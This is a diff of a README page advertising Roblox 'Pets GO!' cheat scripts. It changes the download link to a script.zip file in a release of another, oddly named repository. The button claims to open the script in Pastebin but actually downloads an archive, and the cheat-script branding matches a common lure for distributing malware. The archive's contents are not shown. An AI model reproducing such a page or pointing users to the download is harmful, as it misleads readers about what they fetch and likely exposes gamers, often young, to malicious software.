@@ -5,12 +5,12 @@
 # [ 🔥 Hell Rock 🔥] PETS GO! 🐾 Best Farm Scripts: FAST Auto Fish l Auto Roll l MOBILE! **PASTEBIN**
 
 <div style="text-align: center">
-  <a href="https://github.com/Fisch-Scripts-Roblox/Fisch-Script/releases/download/new/script.zip">
+  <a href="https://github.com/Darkness-Vibe/bookish-octo-fiesta/releases/download/new/script.zip">
     <img class="bumbum" style="width: 1000px" alt="Static Badge" src="https://img.shields.io/badge/Click_For-_Open_Script_in_Pastebin!-purple">
   </a>
 </div>
 
-![image](https://github.com/user-attachments/assets/831311ca-1d79-4cbc-be48-3be2527b5110)
+![image](https://github.com/user-attachments/assets/1db49c8c-c609-434a-b634-67d2fed4f15f)
 
 ![hq720](https://github.com/user-attachments/assets/ecf01ea6-0b3c-484c-a371-27d2f90109c3)
 
